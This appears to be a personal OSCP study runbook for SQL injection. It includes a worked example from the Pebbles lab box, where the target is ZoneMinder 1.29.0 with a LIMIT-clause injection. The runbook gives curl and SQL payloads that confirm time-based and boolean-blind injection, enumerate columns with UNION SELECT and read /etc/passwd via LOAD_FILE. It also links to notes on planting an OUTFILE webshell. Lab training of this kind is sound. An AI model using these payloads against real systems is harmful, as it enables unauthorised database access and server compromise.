---
tags: [oscp, web-app, sqli, runbook]
box_sources: [Pebbles]
---

# Web App — SQLi

*Suspected SQL injection. Confirm it, characterise it, then exploit it.*

---

## Step 1 — Confirm Injection

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `time curl -s -X POST "$URL" -d "param=100;SELECT SLEEP(5)#"` | Response takes ~5 seconds | Numeric param, stacked queries allowed | The `time` wrapper shows elapsed time clearly. `#` is MySQL comment; use `--` for MSSQL/Postgres. Try `'` for string context injection first if numeric fails. | Characterise the injection | No delay → not injectable here, try other params |
| `curl -s "$URL?param=1' AND 1=1-- -"` vs `"?param=1' AND 1=2-- -"` | Response differs between TRUE/FALSE | String-based boolean blind | Classic boolean-blind test. Different response lengths/content = injectable. | Characterise the injection | Same response → not injectable or WAF |

---

## Step 2 — Characterise the Injection

| Question | How to answer |
|---|---|
| Stacked queries? | `SLEEP(5)` via `;` separator |
| UNION-based? | Determine column count first: `ORDER BY 1`, `ORDER BY 2`... until error |
| Error-based? | Trigger a syntax error and read the message |
| LIMIT-injectable? | Numeric param directly in LIMIT clause — stacked queries usually work |
| FILE privilege? | `SELECT 1 INTO OUTFILE '/tmp/test.txt'` — no error = FILE priv granted |

---

## Step 3 — Exploit

### OUTFILE Webshell (requires stacked queries + FILE priv + writable web root)

See: [[Foothold - SQLi to Shell]]

### Data Exfil (UNION-based)

```sql
-- Find column count
limit=1 ORDER BY 10-- -   # increase until error
-- Then use UNION SELECT NULL,NULL,...
limit=-1 UNION SELECT 1,2,3-- -
-- Read a file
limit=-1 UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
```

### Stacked Query OS Command (via UDF sys_exec)

See: [[PrivEsc Linux - UDF]]

---

## Pebbles Example — LIMIT Injection (ZoneMinder 1.29.0)

The log query endpoint exposed the raw `limit` value directly in MySQL:

```
SELECT * FROM Logs WHERE TimeKey > ? order by TimeKey desc limit [input]
```

No quoting — numeric stacked injection. Payload:

```
limit=100;SELECT SLEEP(5)#
```

Web root leaked from the verbose SQL error in the JSON response body. Exploited with OUTFILE webshell.

References: [[6. Pebbles]] | EDB-41239

---

## Module Links

[[10. SQL Injection Attacks]]
